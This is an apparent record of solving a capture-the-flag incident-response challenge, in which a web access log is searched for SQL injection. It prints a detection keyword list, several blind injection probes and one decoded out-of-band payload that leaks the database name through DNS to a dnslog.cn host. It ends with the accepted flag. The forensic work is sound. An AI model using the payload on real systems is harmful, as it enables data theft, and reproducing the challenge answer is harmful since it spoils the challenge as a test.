@@ -1,0 +1,61 @@
+批次：新题独立解题 | #450 2026CCF-Sql注入的应急排查
+
+COMMAND> tar -tf 'D:\Downloads\Sql注入的应急排查.zip'
+access.log
+
+COMMAND> New-Item -ItemType Directory -Path 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450' -Force
+
+COMMAND> Expand-Archive -LiteralPath 'D:\Downloads\Sql注入的应急排查.zip' -DestinationPath 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450' -Force
+
+COMMAND> Get-ChildItem -LiteralPath 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450' -File | Select-Object Name,Length,FullName | Format-Table -AutoSize
+
+Name        Length FullName
+----        ------ --------
+access.log 7429752 C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450\access.log
+
+
+COMMAND> Get-Content -LiteralPath 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450\access.log' -TotalCount 12
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1000 HTTP/1.1" 200 2431 "https://www.baidu.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1004 HTTP/1.1" 200 3451 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1015 HTTP/1.1" 200 3105 "https://www.baidu.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1026 HTTP/1.1" 200 5911 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1037 HTTP/1.1" 200 6216 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1040 HTTP/1.1" 200 7525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1064 HTTP/1.1" 200 7292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1082 HTTP/1.1" 200 7668 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1107 HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1114 HTTP/1.1" 200 6762 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1124 HTTP/1.1" 200 7890 "https://www.baidu.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+10.0.0.10 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1128 HTTP/1.1" 200 7093 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+
+COMMAND> rg -n -i 'dns|burpcollaborator|interactsh|oast|nslookup|load_file|dnslog|extractvalue|updatexml|concat' 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450\access.log' | Select-Object -First 60
+43271:203.0.113.88 - - [20/May/2024:14:02:30 +0800] "GET /search?q=1%27%20AND%20(SELECT%20load_file(concat(%27%5C%5C%5C%5C%27,(select%20database()),%27.p9fin2.dnslog.cn%5C%5Cabc%27)))%20--%20 HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+
+COMMAND> rg -n '203\.0\.113\.88|dnslog\.cn|p9fin2' 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450\access.log'
+43271:203.0.113.88 - - [20/May/2024:14:02:30 +0800] "GET /search?q=1%27%20AND%20(SELECT%20load_file(concat(%27%5C%5C%5C%5C%27,(select%20database()),%27.p9fin2.dnslog.cn%5C%5Cabc%27)))%20--%20 HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+
+COMMAND> Get-Content -LiteralPath 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450\access.log' | Select-Object -Skip 43268 -First 8
+198.98.55.120 - - [20/May/2024:14:00:01 +0800] "GET /product?id=99' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+198.98.55.120 - - [20/May/2024:14:00:01 +0800] "GET /product?id=99' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+203.0.113.88 - - [20/May/2024:14:02:30 +0800] "GET /search?q=1%27%20AND%20(SELECT%20load_file(concat(%27%5C%5C%5C%5C%27,(select%20database()),%27.p9fin2.dnslog.cn%5C%5Cabc%27)))%20--%20 HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+45.33.22.11 - - [20/May/2024:14:00:00 +0800] "GET /product?id=1' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+45.33.22.11 - - [20/May/2024:14:00:00 +0800] "GET /product?id=100' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+45.33.22.11 - - [20/May/2024:14:00:00 +0800] "GET /product?id=11' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+45.33.22.11 - - [20/May/2024:14:00:00 +0800] "GET /product?id=12' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+45.33.22.11 - - [20/May/2024:14:00:00 +0800] "GET /product?id=12' and '1'='1 HTTP/1.1" 403 1024 "-" "Mozilla/5.0"
+
+COMMAND> rg -c -i 'load_file|dnslog\.cn' 'C:\Users\mzj\Desktop\CTF\玄机刷题\题目资料\Sql注入的应急排查_450\access.log'
+1
+
+COMMAND> PowerShell decode URL query from the unique suspicious access.log line
+MATCH: 43271:203.0.113.88 - - [20/May/2024:14:02:30 +0800] "GET /search?q=1%27%20AND%20(SELECT%20load_file(concat(%27%5C%5C%5C%5C%27,(select%20database()),%27.p9fin2.dnslog.cn%5C%5Cabc%27)))%20--%20 HTTP/1.1" 200 5000 "-" "Mozilla/5.0"
+DECODED_QUERY: 1' AND (SELECT load_file(concat('\\\\',(select database()),'.p9fin2.dnslog.cn\\abc'))) -- 
+
+UI ACTIONS (Chrome foreground, Xuanji account slu_mzj):
+- Opened https://xj.edisec.net/challenges/450; title: 2026CCF-Sql注入的应急排查. Visible challenge status before solve: Step #1 0/1, free, medium.
+- Clicked the visible “下载附件” button. Browser download created D:\Downloads\Sql注入的应急排查.zip (315,805 bytes, timestamp 2026-09-28 23:26:30).
+- Clicked “提交FLAG”; entered flag{p9fin2.dnslog.cn}; clicked “提交”.
+- Captured a foreground browser screenshot. The page visibly showed green “已完成”, the step card at 1/1, and the challenge marked complete.
+- Platform validation: ACCEPTED (screenshot evidence visible in the conversation tool output).
+
+ANSWER: flag{p9fin2.dnslog.cn}
